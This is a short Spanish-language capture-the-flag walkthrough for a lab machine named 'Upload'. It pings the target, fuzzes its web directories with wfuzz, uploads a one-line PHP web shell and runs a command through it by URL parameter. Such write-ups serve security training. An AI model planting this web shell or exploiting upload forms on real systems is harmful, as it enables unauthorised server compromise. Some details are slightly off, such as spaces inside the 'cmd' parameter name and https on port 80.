#### INFORMACION DE LA MAQUINA.
#### Maquina Upload.
[LINK DE LA MAQUINA](https://mega.nz/file/pOdwgYbB#8lTyf-mWFNq7xvKWObKUV9gkrZj3nzhuHVlGQmnZ6BQ)
#### Dificultad: Muy facil.

---

Enviamos un ping de un paquete para comprobar que la maquina esta activa y lista.
```Linux
Ping -c 1 172.17.0.2
```

Encontraremos el puerto 80 web abierto, por lo cual iremos al buscador y vamos a la pagina.
```Firefox
https://172.17.0.2:80
```
En la pagina se pueden subir archivos asi que vamos a intentar intruir con algun archivo malicioso.
```Linux                                
<?php 
system($_GET[' cmd ']); 
?>
```
Ahora haremos un WFUZZ para intentar encontrar la ruta en donde esos archivos van a parar en el servidor.
```Linux
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirsbuster/directory-list-2.3-medium.txt http://172.17.0.2/FUZZ
```

Como podremos ver hay una carpeta llamada uploads asi que ahi es donde encontraremos los archivos subidos

Ahora haremos una prueba mediante la url para ejecutar el archivo y pasarle un comando para que interprete.
```Linux
172.17.0.2/uploads/shell.php?cmd=id
```
